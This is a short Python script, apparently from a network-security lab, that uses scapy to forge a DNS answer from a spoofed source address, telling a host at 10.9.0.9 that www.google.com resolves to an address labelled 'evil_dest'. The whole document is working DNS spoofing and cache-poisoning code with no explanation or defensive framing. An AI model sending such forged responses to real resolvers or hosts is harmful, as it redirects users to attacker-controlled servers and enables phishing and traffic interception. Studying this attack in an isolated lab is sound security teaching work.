from scapy.all import *

MYIP = "10.9.0.9"

rrname = "www.google.com"
evil_dest = "6.6.6.6"

dns_req = IP(src="1.1.1.1", dst=MYIP)/UDP(sport=53, dport=53000)/DNS(id=0,
    aa=1,
    rd=1,
    qd=DNSQR(qname=rrname),
    qr=1,
    qdcount=1,
    ancount=1,
    an=DNSRR(rrname=rrname, rdata=evil_dest))
send(dns_req)